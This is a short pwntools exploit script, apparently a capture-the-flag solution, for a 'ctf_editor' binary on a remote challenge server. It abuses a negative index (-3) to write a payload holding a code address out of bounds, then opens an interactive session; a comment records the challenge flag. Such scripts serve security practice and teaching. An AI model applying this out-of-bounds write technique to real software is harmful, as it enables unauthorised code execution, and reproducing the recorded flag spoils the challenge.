from pwn import *

# assume cat > solve
def calc_offset_padding(cat_addr, solve_addr):

    offset = int((solve_addr - cat_addr) / 0xf) - 1
    padding = solve_addr - (offset * 0xf + cat_addr)
    assert (offset * 0xf + padding + cat_addr == solve_addr)
    writing_to = cat_addr - offset * 0xf
    return offset, padding, writing_to

def main():
    LOCAL = False
    if LOCAL:
        elf = ELF('./ctf_editor')
        p = elf.process()
    else:
        p = remote('0.cloud.chals.io', 22354)

    payload = b'ABCDE' + b'\xe9\x11\x40\x00' 
    # payload = 'Y'.encode() + '-3'.encode() + payload

    # hexload = open('./hexload.hex', 'wb')
    # hexload.write('Y'.encode() + '-3'.encode() + payload)

    cat_addr = 0x00404080

    offset, padding, writing_to = calc_offset_padding(cat_addr, 0x404050)
    print(offset, padding, hex(writing_to))

    p.recvuntil('>>> ')
    p.sendline('Y')

    p.recvuntil('>>> ')
    p.sendline(str(-3))

    temp = p.recvuntil('>>> ')
#     print(temp, payload)
    p.sendline(payload)

#     # Edit a category
    p.recvuntil('>>> ')
    p.sendline('Y')
    

#     # # Category num
    a = p.recvuntil('>>> ')
    print("Val is: ", a)
    p.sendline('recon')
    p.interactive()
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())

    # uscg{l1b3rty_1s_n3v3r_0ut_0f_b0unds}


if __name__ == '__main__':
    main()

